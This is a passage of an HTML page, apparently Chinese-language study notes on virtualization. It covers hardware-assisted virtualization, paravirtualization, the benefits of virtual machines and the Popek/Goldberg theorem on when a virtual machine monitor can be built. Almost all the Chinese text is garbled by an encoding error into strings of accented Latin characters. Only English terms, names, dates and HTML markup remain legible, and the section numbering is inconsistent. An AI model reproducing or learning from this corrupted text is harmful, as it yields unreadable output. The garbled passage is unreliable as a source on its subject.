Virtualizationï¼ŒHVMï¼‰</strong>ï¼š<ul><li>è¿™ç§æ–¹æ³•æ˜¯ä¸ºå…·æœ‰å¯¹è™šæ‹ŸåŒ–æä¾›ä½“ç³»ç»“æ„æ”¯æŒçš„ä½“ç³»ç»“æ„æ„å»ºçš„è™šæ‹ŸåŒ–ç›‘è§†å™¨ï¼ŒåŒ…æ‹¬æ‰€æœ‰æœ€è¿‘çš„å¤„ç†å™¨ã€‚è¿™æ ·çš„è™šæ‹ŸåŒ–ç›‘è§†å™¨è¿˜æ”¯æŒæœªç»ä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿã€‚</li><li>ä¸è½¯ä»¶è™šæ‹ŸåŒ–æ–¹æ³•ä¸åŒï¼ŒHVMè™šæ‹ŸåŒ–ç›‘è§†å™¨å®Œå…¨ä¾èµ–äºç›´æ¥æ‰§è¡Œè™šæ‹ŸæœºæŒ‡ä»¤ï¼Œè€Œä¸éœ€è¦ç¿»è¯‘ã€‚åœ¨æ–‡çŒ®ä¸­ï¼ŒHVMæœ‰æ—¶è¢«ç§°ä¸ºHVã€‚è¯¦ç»†çš„è¦æ±‚åœ¨ç¬¬2ç« ä¸­å¾—åˆ°æ­£å¼å®šä¹‰ã€‚</li><li>æ¶æ„å’Œè™šæ‹ŸåŒ–ç›‘è§†å™¨çš„ç¤ºä¾‹åœ¨ç¬¬4ç« ä¸­è®¨è®ºx86ä½“ç³»ç»“æ„çš„VT-xå’Œç¬¬7ç« ä¸­è®¨è®ºARMä½“ç³»ç»“æ„çš„è™šæ‹ŸåŒ–æ‰©å±•ã€‚</li></ul></li><li><strong>åŠè™šæ‹ŸåŒ–ï¼ˆParavirtualizationï¼‰</strong>ï¼š<ul><li>è¿™ç§æ–¹æ³•è¿›è¡Œäº†ä¸åŒçš„æƒè¡¡ï¼Œæ›´æ³¨é‡ç®€å•æ€§å’Œæ•´ä½“æ•ˆç‡ï¼Œè€Œä¸æ˜¯ä¸åº•å±‚ç¡¬ä»¶çš„å®Œå…¨å…¼å®¹æ€§ã€‚è¿™ä¸ªæœ¯è¯­æœ€æ—©ç”±Denaliå¼•å…¥ï¼Œåæ¥ç”±æ—©æœŸçš„Xenè™šæ‹ŸåŒ–ç›‘è§†å™¨å¹¿æ³›ä½¿ç”¨ã€‚</li><li>åœ¨æ²¡æœ‰è™šæ‹ŸåŒ–æ”¯æŒçš„å¹³å°ä¸Šä½¿ç”¨æ—¶ï¼ŒåŠè™šæ‹ŸåŒ–è¦æ±‚æ›´æ”¹å®¢æˆ·æ“ä½œç³»ç»Ÿçš„äºŒè¿›åˆ¶ä»£ç ï¼Œä»¥ä¸åº•å±‚ç¡¬ä»¶å…¼å®¹ã€‚è€Œåœ¨å…·å¤‡å®Œå…¨è™šæ‹ŸåŒ–æ”¯æŒçš„ä½“ç³»ç»“æ„ä¸Šï¼ŒåŠè™šæ‹ŸåŒ–ä»ç„¶ç”¨äºé€šè¿‡å¹³å°ç‰¹å®šçš„æ‰©å±•æ¥å¢å¼ºHVMï¼Œé€šå¸¸åœ¨è®¾å¤‡é©±åŠ¨ç¨‹åºä¸­å®ç°ï¼Œä¾‹å¦‚ååŒç®¡ç†å†…å­˜æˆ–å®ç°é«˜æ€§èƒ½çš„å‰ç«¯è®¾å¤‡ã€‚</li><li>è¿™å°†åœ¨Â§3.3ä¸­è¯¦ç»†æè¿°ã€‚</li></ul></li></ol><h2 id="1-8-ä½¿ç”¨è™šæ‹Ÿæœºçš„å¥½å¤„"><a href="#1-8-ä½¿ç”¨è™šæ‹Ÿæœºçš„å¥½å¤„" class="headerlink" title="1.8 ä½¿ç”¨è™šæ‹Ÿæœºçš„å¥½å¤„"></a>1.8 ä½¿ç”¨è™šæ‹Ÿæœºçš„å¥½å¤„</h2><p>è™šæ‹Ÿæœºæœ€åˆæ˜¯åœ¨å¤§å‹æœºä¸Šå‘æ˜çš„ï¼Œå½“æ—¶ç¡¬ä»¶ç¨€ç¼ºè€Œä¸”éå¸¸æ˜‚è´µï¼Œæ“ä½œç³»ç»Ÿè¿˜å¾ˆåŸå§‹</p><p>å¥½å¤„ï¼š</p><ol><li><strong>æ“ä½œç³»ç»Ÿå¤šæ ·æ€§</strong>ï¼šè™šæ‹ŸåŒ–å…è®¸ä¸åŒçš„æ“ä½œç³»ç»ŸåŒæ—¶è¿è¡Œåœ¨ä¸€å°è®¡ç®—æœºä¸Šã€‚è¿™æ˜¯è®¸å¤šæ¡Œé¢å¯¼å‘çš„Type-2è™šæ‹ŸåŒ–ç›‘è§†å™¨çš„ä¸»è¦åŸå› ä¹‹ä¸€ã€‚ä¾‹å¦‚ï¼Œå®ƒä½¿å¾—åœ¨Mac OS ä¸Šä½¿ç”¨è™šæ‹Ÿæœºï¼ˆå¦‚Fusionå’ŒParallelsï¼‰è¿è¡ŒWindowsï¼ˆæœ‰æ—¶è¿˜åŒ…æ‹¬Linuxï¼‰æˆä¸ºå¯èƒ½ã€‚</li><li><strong>æœåŠ¡å™¨æ•´åˆ</strong>ï¼šä»Šå¤©ï¼Œä¼ä¸šITæœ€ä½³å®è·µä»ç„¶è¦æ±‚æ¯å°æœåŠ¡å™¨æ¯æ¬¡è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚éšç€ç¡¬ä»¶æ€§èƒ½å’Œæ•ˆç‡çš„æé«˜ï¼Œä¸€å°ç‰©ç†æœºé€šå¸¸æ›´å¤šåœ°æˆä¸ºä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¿™ç§æœåŠ¡å™¨æ•´åˆå¯ä»¥èŠ‚çœç¡¬ä»¶æˆæœ¬å’Œæ•°æ®ä¸­å¿ƒèµ„æºã€‚</li><li><strong>å¿«é€Ÿéƒ¨ç½²</strong>ï¼šéƒ¨ç½²ç‰©ç†æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå¤æ‚è€Œè€—æ—¶çš„ä»»åŠ¡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå¯ä»¥é€šè¿‡é—¨æˆ·æˆ–APIå®Œå…¨åœ¨è½¯ä»¶ä¸­åˆ›å»ºè™šæ‹Ÿæœºï¼Œå¹¶éƒ¨ç½²è½¯ä»¶å †æ ˆä½œä¸ºè™šæ‹Ÿè®¾å¤‡ã€‚è¿™ç§å¿«é€Ÿéƒ¨ç½²æœ‰åŠ©äºæé«˜æ•ˆç‡å’Œçµæ´»æ€§ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šè™šæ‹ŸåŒ–å¼•å…¥äº†æ•°æ®ä¸­å¿ƒå †æ ˆä¸­çš„æ–°ç®¡ç†å±‚ï¼Œä¸å®¢æˆ·æ“ä½œç³»ç»Ÿä¸åŒä¸”ä¸å¯è§ï¼Œä½†èƒ½å¤Ÿå®¡æŸ¥æ“ä½œç³»ç»Ÿçš„è¡Œä¸ºã€æ‰§è¡Œå…¥ä¾µåˆ†æã€æˆ–éªŒè¯å…¶æ¥æºã€‚è™šæ‹ŸåŒ–ç›‘è§†å™¨è¿˜å¯ä»¥æ§åˆ¶è™šæ‹Ÿæœºçš„æ‰€æœ‰I/Oæ“ä½œï¼Œä»è€Œè½»æ¾æ’å…¥è™šæ‹Ÿæœºç‰¹å®šçš„é˜²ç«å¢™æˆ–è¿æ¥åˆ°è™šæ‹Ÿç½‘ç»œï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚</li><li><strong>é«˜å¯ç”¨æ€§</strong>ï¼šè™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå°è£…çš„æŠ½è±¡ï¼Œå¯ä»¥åœ¨ä»»ä½•è¿è¡Œå…¼å®¹è™šæ‹ŸåŒ–ç›‘è§†å™¨çš„æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚å› æ­¤ï¼Œè™šæ‹Ÿæœºå¯ä»¥åœ¨ç¡¬ä»¶å´©æºƒååœ¨æ–°æœåŠ¡å™¨ä¸Šé‡æ–°å¯åŠ¨ï¼Œæ— éœ€è¿›è¡Œæ“ä½œç³»ç»Ÿçº§çš„é…ç½®æˆ–æ„ŸçŸ¥ï¼Œä»è€Œæä¾›äº†é«˜å¯ç”¨æ€§è§£å†³æ–¹æ¡ˆã€‚</li><li><strong>åˆ†å¸ƒå¼èµ„æºè°ƒåº¦</strong>ï¼šä½¿ç”¨å®æ—¶è¿ç§»æŠ€æœ¯ï¼Œä¸€ç»„è™šæ‹ŸåŒ–ç›‘è§†å™¨å¯ä»¥å˜æˆä¸€ä¸ªå•ä¸€çš„èµ„æºæ± ï¼Œå…è®¸åœ¨é›†ç¾¤ä¸­è‡ªåŠ¨å’Œé€æ˜åœ°é‡æ–°å¹³è¡¡è™šæ‹Ÿæœºã€‚è¿™æé«˜äº†èµ„æºçš„åˆ©ç”¨æ•ˆç‡ã€‚</li><li><strong>äº‘è®¡ç®—</strong>ï¼šåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œä¸åŒçš„å®¢æˆ·ï¼ˆç§Ÿæˆ·ï¼‰å¯ä»¥åœ¨å½¼æ­¤éš”ç¦»çš„ç¯å¢ƒä¸­è¿è¡Œè‡ªå·±çš„è™šæ‹Ÿæœºã€‚å½“ä¸ç½‘ç»œè™šæ‹ŸåŒ–ç­‰æŠ€æœ¯ç»“åˆä½¿ç”¨æ—¶ï¼Œè¿™ä¸ºäº‘è®¡ç®—æä¾›äº†åŸºç¡€ï¼ŒåŒ…æ‹¬Amazon Web Servicesã€Google Compute Engineå’ŒMicrosoft Azureç­‰äº‘è®¡ç®—æŠ€æœ¯ã€‚</li></ol><h1 id="2-The-Popek-Goldberg-theorem"><a href="#2-The-Popek-Goldberg-theorem" class="headerlink" title="2 The Popek/Goldberg theorem"></a>2 The Popek/Goldberg theorem</h1><p>åœ¨1974å¹´ï¼ŒGerald Popek å’Œ Robert Goldberg åœ¨ACMé€šä¿¡æ‚å¿—ä¸Šå‘è¡¨äº†ä¸€ç¯‡é‡è¦çš„è®ºæ–‡ï¼Œåä¸ºã€Šç¬¬ä¸‰ä»£ä½“ç³»ç»“æ„çš„è™šæ‹ŸåŒ–çš„å½¢å¼è¦æ±‚ã€‹ï¼Œè¯¥è®ºæ–‡å®šä¹‰äº†ç¡®ä¿è™šæ‹Ÿæœºç®¡ç†å™¨ï¼ˆVMMï¼‰å¯ä»¥æ„å»ºçš„å¿…è¦å’Œå……åˆ†çš„å½¢å¼è¦æ±‚ [143]ã€‚å‡†ç¡®åœ°è¯´ï¼Œä»–ä»¬çš„å®šç†<strong>ç¡®å®šäº†ä¸€ä¸ªç»™å®šçš„æŒ‡ä»¤é›†æ¶æ„ï¼ˆISAï¼‰æ˜¯å¦å¯ä»¥é€šè¿‡ä½¿ç”¨å¤šè·¯å¤ç”¨æ¥è™šæ‹ŸåŒ–ï¼Œä½¿å…¶å¯ä»¥åœ¨è™šæ‹Ÿæœºå†…è¿è¡Œ</strong>ã€‚å¯¹äºæ»¡è¶³å®šç†å‡è®¾çš„ä»»ä½•ä½“ç³»ç»“æ„ï¼Œä»»ä½•ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šçš„æ“ä½œç³»ç»Ÿä¹Ÿå¯ä»¥åœ¨è™šæ‹Ÿæœºå†…è¿è¡Œï¼Œæ— éœ€è¿›è¡Œä¿®æ”¹ã€‚å½“æ—¶ï¼Œè¿™é¡¹å·¥ä½œçš„åŠ¨æœºæ˜¯è¦è§£å†³æ–°ä½“ç³»ç»“æ„æ„å¤–åœ°é˜»æ­¢äº†VMMæ„å»ºçš„è¯æ®ã€‚ä½œè€…åœ¨æ–‡ç« ä¸­å¼•ç”¨äº†DEC PDP-10ï¼Œå…¶ä¸­çœ‹ä¼¼éšæœºçš„æ¶æ„å†³ç­–â€œç ´åâ€äº†è™šæ‹ŸåŒ–ã€‚å°½ç®¡ç»“æœå¾ˆç®€å•ï¼Œä½†è¿™ä¸ªå®šç†çš„ç›¸å…³æ€§åœ¨å‡ åå¹´å†…éƒ½è¢«è®¡ç®—æœºæ¶æ„å¸ˆå¿½è§†äº†ï¼Œä¸€ä»£åˆä¸€ä»£çš„æ–°å¤„ç†å™¨æ¶æ„éƒ½æ²¡æœ‰è€ƒè™‘è¿™ä¸ªå®šç†çš„æŠ€æœ¯è¦æ±‚ã€‚ç›´åˆ°åæ¥ï¼Œéšç€è™šæ‹Ÿæœºå†æ¬¡å˜å¾—é‡è¦ï¼Œè‹±ç‰¹å°”å’ŒAMDæ˜ç¡®ç¡®ä¿ä»–ä»¬çš„è™šæ‹ŸåŒ–æ‰©å±•æ»¡è¶³Popekå’ŒGoldbergçš„æ ‡å‡†ï¼Œä»¥ä¾¿æœªç»ä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿå¯ä»¥ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œï¼Œè€Œæ— éœ€ä½¿ç”¨è½¯ä»¶ç¿»è¯‘æˆ–åŠè™šæ‹ŸåŒ– [171]ã€‚ä»Šå¤©ï¼Œè¿™ä¸ªå®šç†ä»ç„¶æ˜¯ç†è§£è®¡ç®—æœºä½“ç³»ç»“æ„ä¸å…¶æ”¯æŒè™šæ‹Ÿæœºçš„èƒ½åŠ›ä¹‹é—´çš„åŸºæœ¬å…³ç³»çš„æ˜æ˜¾èµ·ç‚¹ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªå®šç†ç¡®å®šäº†ä¸€ä¸ªä»…ä¾èµ–äºç›´æ¥æ‰§è¡Œçš„VMMæ˜¯å¦èƒ½å¤Ÿæ”¯æŒå®¢æˆ·ä»»æ„æ“ä½œç³»ç»Ÿã€‚</p><h2 id="1-1-æ¨¡å‹"><a href="#1-1-æ¨¡å‹" class="headerlink" title="1.1 æ¨¡å‹"></a>1.1 æ¨¡å‹</h2><blockquote><p>ç•¥å»æ•°å­¦è¯æ˜</p></blockquote><p>å°½ç®¡å­˜åœ¨ç†æƒ³åŒ–ï¼Œç‰¹åˆ«æ˜¯ç”±äºç¼ºä¹å¯„å­˜å™¨ï¼Œä½†è¿™ç§ä½“ç³»ç»“æ„æ¨¡å‹ä¸æˆ‘ä»¬ä»Šå¤©éƒ½ç†Ÿæ‚‰çš„æ¨¡å‹åŸºæœ¬æ²¡æœ‰æ ¹æœ¬åŒºåˆ«ã€‚å¯¹äºè¿™ç§ä½“ç³»ç»“æ„ï¼ŒPopekå’ŒGoldbergæå‡ºäº†ä»¥ä¸‹å½¢å¼åŒ–ç ”ç©¶é—®é¢˜ã€‚â€¦å‡è®¾å­˜åœ¨ä¸€ä¸ªç¬¦åˆè¿™ä¸€åŸºæœ¬ä½“ç³»ç»“æ„æ¨¡å‹çš„è®¡ç®—æœºï¼Œåœ¨å“ªäº›æ˜ç¡®æ¡ä»¶ä¸‹å¯ä»¥æ„å»ºä¸€ä¸ªVMMï¼Œä»¥ä¾¿VMMï¼š</p><ul><li>èƒ½å¤Ÿæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªè™šæ‹Ÿæœºï¼›</li><li>åœ¨ä»»ä½•æ—¶å€™éƒ½å®Œå…¨æ§åˆ¶è®¡ç®—æœºï¼›</li><li>æ”¯æŒé’ˆå¯¹ç›¸åŒä½“ç³»ç»“æ„è®¾è®¡çš„ä»»æ„ã€æœªç»ä¿®æ”¹çš„ã€æ½œåœ¨æ¶æ„çš„æ“ä½œç³»ç»Ÿï¼›ä»¥åŠ</li><li>å…·å¤‡é«˜æ•ˆæ€§ï¼Œæœ€åæƒ…å†µä¸‹åªä¼šå¯¼è‡´é€Ÿåº¦ç•¥å¾®ä¸‹é™ï¼Ÿ</li></ul><p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆå†³å®šäº†æ˜¯å¦å¯ä»¥ä¸ºç‰¹å®šçš„ä½“ç³»ç»“æ„æ„å»ºVMMï¼Œä»¥ä¾¿ç”Ÿæˆçš„â€œè™šæ‹Ÿæœºå¯ä»¥æ˜¯å®é™…æœºå™¨çš„é«˜æ•ˆã€éš”ç¦»çš„å‰¯æœ¬â€ã€‚å½“æ»¡è¶³æ¡ä»¶æ—¶ï¼Œå®šç†å¿…é¡»ç¡®ä¿ç¬¦åˆä»¥ä¸‹ä¸‰ä¸ªæ ‡å‡†ï¼š</p><ol><li>ç­‰æ•ˆæ€§ï¼šè™šæ‹Ÿæœºä¸åº•å±‚å¤„ç†å™¨åŸºæœ¬ç›¸åŒï¼Œå³è®¡ç®—æœºä½“ç³»ç»“æ„çš„å‰¯æœ¬ã€‚åœ¨è™šæ‹Ÿæœºå†…è¿è¡Œçš„ä»»ä½•ç¨‹åºï¼Œå³ä»»ä½•å®¢æˆ·æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºç»„åˆï¼Œåº”è¯¥è¡¨ç°å‡ºä¸è¯¥ç¨‹åºç›´æ¥åœ¨åº•å±‚ç¡¬ä»¶ä¸Šè¿è¡Œæ—¶ç›¸åŒçš„è¡Œä¸ºï¼Œé™¤äº†å¯èƒ½ç”±äºæ—¶é—´ä¾èµ–æ€§æˆ–èµ„æºå¯ç”¨æ€§ï¼ˆä¾‹å¦‚ç‰©ç†å†…å­˜é‡ï¼‰ç­‰å·®å¼‚ã€‚</li><li>å®‰å…¨æ€§ï¼šVMMå¿…é¡»å§‹ç»ˆå®Œå…¨æ§åˆ¶ç¡¬ä»¶ï¼Œè€Œä¸åšä»»ä½•å…³äºè™šæ‹Ÿæœºå†…è¿è¡Œçš„è½¯ä»¶çš„å‡è®¾ã€‚è™šæ‹Ÿæœºä¸åº•å±‚ç¡¬ä»¶éš”ç¦»ï¼Œè¿è¡Œæ–¹å¼å°±å¥½åƒå®ƒåœ¨ä¸€ä¸ªç‹¬ç«‹çš„è®¡ç®—æœºä¸Šè¿è¡Œä¸€æ ·ã€‚æ­¤å¤–ï¼Œä¸åŒçš„è™šæ‹Ÿæœºå¿…é¡»ç›¸äº’éš”ç¦»ã€‚è¯¥å®šç†åŠå…¶è¯æ˜å…³æ³¨ç¬¬ä¸€ä¸ªå®‰å…¨æ€§å±æ€§ã€‚ç¬¬äºŒä¸ªå±æ€§å¯ä»¥é€šè¿‡ç¡®ä¿åœ¨ä¸¤ä¸ªè™šæ‹Ÿæœºä¹‹é—´æ²¡æœ‰å…±äº«çŠ¶æ€æ¥å®ç°ã€‚</li><li>æ€§èƒ½ï¼šæ•ˆç‡è¦æ±‚æ„å‘³ç€åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¿è¡Œçš„ç¨‹åºçš„æ‰§è¡Œé€Ÿåº¦æœ€å¤šåªä¼šæ¯”ç›´æ¥åœ¨åº•å±‚ç¡¬ä»¶ä¸Šè¿è¡Œæ—¶çš„æ‰§è¡Œæ—¶é—´ç•¥å¾®ä¸‹é™ã€‚</li></ol><h2 id="2-2-å®šç†"><a href="#2-2-å®šç†" class="headerlink" title="2.2 å®šç†"></a>2.2 å®šç†</h2><blockquote><p>å®šç†1 [143]ï¼šå¯¹äºä»»ä½•ä¼ ç»Ÿçš„ç¬¬ä¸‰ä»£è®¡ç®—æœºï¼Œå¦‚æœè¯¥è®¡ç®—æœºçš„æ•æ„ŸæŒ‡ä»¤é›†æ˜¯ç‰¹æƒæŒ‡ä»¤é›†çš„å­é›†ï¼Œé‚£ä¹ˆå¯ä»¥æ„å»ºä¸€ä¸ªè™šæ‹Ÿæœºç›‘è§†å™¨</p></blockquote><h2 id="2-3-é€’å½’è™šæ‹ŸåŒ–å’Œæ··åˆè™šæ‹Ÿæœº"><a href="#2-3-é€’å½’è™šæ‹ŸåŒ–å’Œæ··åˆè™šæ‹Ÿæœº" class="headerlink" title="2.3 é€’å½’è™šæ‹ŸåŒ–å’Œæ··åˆè™šæ‹Ÿæœº"></a>2.3 é€’å½’è™šæ‹ŸåŒ–å’Œæ··åˆè™šæ‹Ÿæœº</h2><p>è¯¥è®ºæ–‡åŒ…æ‹¬å¦å¤–ä¸¤ä¸ªå®šç†ï¼Œåˆ†åˆ«æ¶µç›–é€’å½’è™šæ‹ŸåŒ–å’Œæ··åˆè™šæ‹Ÿæœºçš„è¦æ±‚ã€‚è¿™ä¸ªå½¢å¼ä¸»ä¹‰ä¹Ÿé€‚ç”¨äºé€’å½’è™šæ‹ŸåŒ–çš„æ¨ç†ã€‚äº‹å®ä¸Šï¼Œæ»¡è¶³å®šç†æ¡ä»¶çš„ç†æƒ³åŒ–ä½“ç³»ç»“æ„ä¹Ÿå¯ä»¥æ”¯æŒé€’å½’è™šæ‹Ÿæœºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè™šæ‹Ÿæœºå¯ä»¥åœ¨å®¢æˆ·-ç›‘ç®¡æ¨¡å¼ä¸‹è¿è¡Œä¸€ä¸ªVMMï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚è¿™ä¸ªVMMå½“ç„¶å¯ä»¥è¿è¡Œå¤šä¸ªè™šæ‹Ÿæœºï¼Œå®ƒä»¬çš„å®¢æˆ·æ“ä½œç³»ç»Ÿä»¥åŠå®ƒä»¬å„è‡ªçš„åº”ç”¨ç¨‹åºã€‚è¯¥è®ºæ–‡çš„ç¬¬äºŒä¸ªå®šç†è§„èŒƒåŒ–äº†å¯¹VMMï¼ˆè€Œä¸æ˜¯ä½“ç³»ç»“æ„ï¼‰æå‡ºçš„æœ€å°‘çš„é™„åŠ å‡è®¾é›†ï¼Œä»¥æ”¯æŒé€’å½’è™šæ‹Ÿæœºã€‚åœ¨é€’å½’è™šæ‹ŸåŒ–ä¸­ï¼ŒVMMæœ¬èº«å¿…é¡»åœ¨è™šæ‹Ÿæœºå†…ï¼ˆæœªä¿®æ”¹åœ°ï¼‰è¿è¡Œã€‚è¿‘å¹´æ¥ï¼Œé€’å½’è™šæ‹ŸåŒ–çš„ç ”ç©¶å…´è¶£æœ‰æ‰€å¢åŠ  [33, 191]ã€‚</p><p>è¯¥è®ºæ–‡è¿˜å¼•å…¥äº†æ··åˆè™šæ‹Ÿæœºçš„æ¦‚å¿µï¼Œè®¨è®ºäº†åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¸æ»¡è¶³æ ‡å‡†çš„æƒ…å†µã€‚å†æ¬¡è€ƒè™‘PDP-10çš„JRST 1æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤å¯ç”¨äºä»ç›‘ç®¡æ¨¡å¼è¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ï¼ŒåŒæ ·ä¹Ÿå¯ç”¨äºåœ¨å·²ç»å¤„äºç”¨æˆ·æ¨¡å¼æ—¶è¿”å›å­ç¨‹åºã€‚æ˜¾ç„¶ï¼Œè¿™æ˜¯ç¾éš¾æ€§çš„ï¼Œå› ä¸ºè™šæ‹Ÿæœºå°†åœ¨æ²¡æœ‰å¿…è¦è¿›å…¥VMMçš„æƒ…å†µä¸‹åœ¨å®¢æˆ·æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¹‹é—´åˆ‡æ¢ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè™šæ‹Ÿæœºå°†åœ¨VMMè®¤ä¸ºå®ƒä»ç„¶å¤„äºå®¢æˆ·-ç›‘ç®¡æ¨¡å¼æ—¶æ‰§è¡Œåº”ç”¨ç¨‹åºä»£ç ï¼Œå°½ç®¡è¿™æ˜¾ç„¶æ˜¯ä¸å¯æ¥å—çš„ã€‚ä½†å¯¹äºè¿™ä¸ªç‰¹å®šæŒ‡ä»¤æ¥è¯´ï¼Œå…³é”®è§‚å¯Ÿæ˜¯ï¼Œåªæœ‰å½“è™šæ‹Ÿæœºå¤„äºç›‘ç®¡æ¨¡å¼æ—¶ï¼Œå®ƒæ‰æ˜¯æ§åˆ¶æ•æ„Ÿçš„ã€‚å½“è™šæ‹Ÿæœºå¤„äºç”¨æˆ·æ¨¡å¼æ—¶ï¼Œè¯¥ç‰¹å®šæŒ‡ä»¤å¯¹è™šæ‹ŸåŒ–ä¸æ•æ„Ÿã€‚å½¢å¼ä¸Šæ¥è¯´ï¼Œè®©æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæŒ‡ä»¤åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ˜¯ç”¨æˆ·æ•æ„Ÿçš„ï¼Œå¦‚æœå®ƒåœ¨ç›‘ç®¡æ¨¡å¼ä¸‹æ˜¯è¡Œä¸ºæ•æ„Ÿçš„æˆ–è€…æ§åˆ¶æ•æ„Ÿçš„ï¼Œä½†åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ä¸æ•æ„Ÿã€‚è¯¥å®šç†é™ˆè¿°å¦‚ä¸‹ã€‚</p><blockquote><p>å®šç†3[143] : å¯ä»¥ä¸ºä»»ä½•ä¼ ç»Ÿçš„ç¬¬ä¸‰ä»£æœºå™¨æ„é€ æ··åˆè™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œå…¶ä¸­ç”¨æˆ·æ•æ„ŸæŒ‡ä»¤é›†æ˜¯ç‰¹æƒæŒ‡ä»¤é›†çš„å­é›†ã€‚</p></blockquote><p>å®šç†3è¦æ¯”å®šç†1å¼±å¾—å¤šï¼Œç”±æ­¤äº§ç”Ÿçš„æ··åˆè™šæ‹Ÿæœºç›‘è§†å™¨ä¸ä¼ ç»Ÿçš„VMMç›¸å½“ä¸åŒã€‚å…·ä½“æ¥è¯´ï¼Œæ··åˆè™šæ‹Ÿæœºç›‘è§†å™¨å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ï¼š</p><ul><li>å½“è™šæ‹Ÿæœºè¿è¡Œåº”ç”¨ç¨‹åºæ—¶ï¼Œå³å¤„äºå®¢æˆ·-ç”¨æˆ·æ¨¡å¼æ—¶ï¼Œæ··åˆVMMçš„è¡Œä¸ºç±»ä¼¼äºæ™®é€šçš„VMMã€‚</li><li>åœ¨è™šæ‹Ÿæœº-ç›‘ç®¡æ¨¡å¼ä¸‹ï¼Œæ··åˆVMMä¸ä½¿ç”¨ç›´æ¥æ‰§è¡Œï¼Œè€Œæ˜¯ä»¥100%çš„è½¯ä»¶æ–¹å¼è§£é‡Šæ‰€æœ‰æŒ‡ä»¤ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒè§£é‡Šäº†é€šè¿‡å®¢æˆ·æ“ä½œç³»ç»Ÿçš„æ‰€æœ‰è·¯å¾„çš„æ‰§è¡Œã€‚å°½ç®¡è§£é‡Šä¼šäº§ç”Ÿå¾ˆé«˜çš„å¼€é”€ï¼Œä½†åªè¦åœ¨ç›¸å…³å·¥ä½œè´Ÿè½½ä¸­åœ¨æ“ä½œç³»ç»Ÿä¸­èŠ±è´¹çš„æ—¶é—´éƒ¨åˆ†è¾ƒå°ï¼Œè¿™ç§æ–¹æ³•å¯èƒ½æ˜¯å¯è¡Œçš„ã€‚ç¬¬ä¸‰ä¸ªå®šç†åœ¨æ—©æœŸè¯†åˆ«äº†ä¸€ä¸ªå…³é”®çš„ç»†å¾®å·®åˆ«ï¼Œåœ¨åæ¥åŠè™šæ‹ŸåŒ–å’Œæ··åˆè§£å†³æ–¹æ¡ˆå‡ºç°æ—¶ï¼Œè¿™ä¸ªå·®åˆ«å°†å‘æŒ¥è‡³å…³é‡è¦çš„ä½œç”¨ï¼Œè¿™äº›è§£å†³æ–¹æ¡ˆå°†ç›´æ¥æ‰§è¡Œä¸äºŒè¿›åˆ¶ç¿»è¯‘ç›¸ç»“åˆã€‚è¿™äº›å°†åœ¨åé¢çš„ç« èŠ‚ä¸­è®¨è®ºã€‚</li></ul><h2 id="2-4-è®¨è®º-ç”¨åˆ†é¡µä»£æ›¿åˆ†æ®µ"><a href="#2-4-è®¨è®º-ç”¨åˆ†é¡µä»£æ›¿åˆ†æ®µ" class="headerlink" title="2.4 è®¨è®º: ç”¨åˆ†é¡µä»£æ›¿åˆ†æ®µ"></a>2.4 è®¨è®º: ç”¨åˆ†é¡µä»£æ›¿åˆ†æ®µ</h2><p>1974å¹´çš„åŸå§‹è®ºæ–‡è®¤è¯†åˆ°è™šæ‹Ÿå†…å­˜æ˜¯ä»»ä½•ç±»å‹çš„è™šæ‹ŸåŒ–æ”¯æŒçš„åŸºæœ¬å‰æã€‚</p><p>ä¸ºäº†ç®€åŒ–èµ·è§ï¼Œä½œè€…å‡è®¾è™šæ‹Ÿå†…å­˜æ˜¯é€šè¿‡å•ä¸ªé‡å®šä½ç»‘å®šçš„å¯„å­˜å™¨å¯¹æ¥å®ç°çš„ã€‚ç°åœ¨ï¼Œè€ƒè™‘ä¸€ä¸ªæ›´ç°å®çš„æ¨¡å‹ï¼Œå…¶ä¸­è™šæ‹Ÿå†…å­˜æ˜¯é€šè¿‡åˆ†é¡µè€Œä¸æ˜¯åˆ†æ®µæ¥å®ç°çš„ã€‚å¦‚æœä½¿ç”¨åˆ†é¡µæ¥å®ç°è™šæ‹Ÿå†…å­˜ï¼Œå®šç†æ˜¯å¦ä»ç„¶é€‚ç”¨ï¼Ÿç®€çŸ­çš„ç­”æ¡ˆæ˜¯æ˜¯ï¼Œä½†æ·±å…¥åˆ†æä¼šå‘ç°åœ¨ç¬¬ä¸‰ä»£æ¨¡å‹ä¸­ä¸å­˜åœ¨çš„ç»†å¾®å·®åˆ«ï¼Œè¿™äº›å·®åˆ«åœ¨æ„å»ºå®é™…ç³»ç»Ÿæ—¶å°†å‘æŒ¥å®é™…ä½œç”¨ã€‚ç‰¹åˆ«æ˜¯ï¼Œè®¿é—®å†…å­˜çš„æŒ‡ä»¤å¯èƒ½æ˜¯ä½ç½®æ•æ„Ÿçš„ï¼Œå› 